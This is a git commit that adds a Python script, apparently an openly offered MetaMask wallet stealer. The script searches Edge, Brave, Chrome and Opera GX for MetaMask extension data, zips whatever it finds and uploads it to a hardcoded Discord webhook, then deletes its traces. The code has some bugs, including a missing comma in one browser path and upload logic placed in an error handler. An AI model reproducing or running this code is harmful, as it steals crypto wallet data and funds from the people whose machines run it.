0007ce5585ad1ae21971392121e06e5cb852286e
Lawxsz <116668706+Lawxsz@users.noreply.github.com>
2023-02-21 21:25:32 -0300

    Create metamask.py

---
+++ scripts/metamask.py
@@ -0,0 +1,45 @@
+# #  # # # # # # # # # # # # # # # # # # #
+#  GITHUB.COM/Lawxsz                     #
+#                                        #
+#  Credits or at least one star :)       #
+#                                        #
+# #  # # # # # # # # # # # # # # # # # # #
+
+import requests, os, os.path, shutil
+
+user = os.path.expanduser("~")
+
+hook = "https://discord.com/api/webhooks/1073970412322566175/HtYFF6lf77URUMpHJPH-egvs0iOSEsYV6yXuuPmw3QGvXG1A_rJRFYX3z9p6jYcRrjgl"
+
+def make(args, brow, count):
+   try:
+    if os.path.exists(args):
+     shutil.copytree(args, user+f"\\AppData\\Local\\Temp\\Metamask_{brow}")
+     
+     print(f"New Wallet found! : Total: {count}\nWallet: MetaMask_{brow}")
+   except shutil.Error:
+       pass
+       shutil.make_archive(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}", "zip", user+f"\\AppData\\Local\\Temp\\Metamask_{brow}")
+       file = {"file": open(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}.zip", 'rb')}
+       r = requests.post(hook, files=file)
+       os.remove(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}")
+       os.remove(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}.zip")
+def yea():
+    
+ meta_paths = [
+   
+        [f"{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm",               "Edge"               ],
+        [f"{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",               "Edge"               ],
+        [f"{user}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",               "Brave"               ],
+        [f"{user}\\AppData\\Local\\Google\\Chrome\\User Data\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"               "Google"               ],
+        [f"{user}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",               "OperaGX"               ]
+    ]
+ count = 0
+ try:
+  for i in meta_paths:
+   make(i[0], brow=i[1], count=count)
+   count+=1
+ except IndexError:
+     pass
+     
+yea()
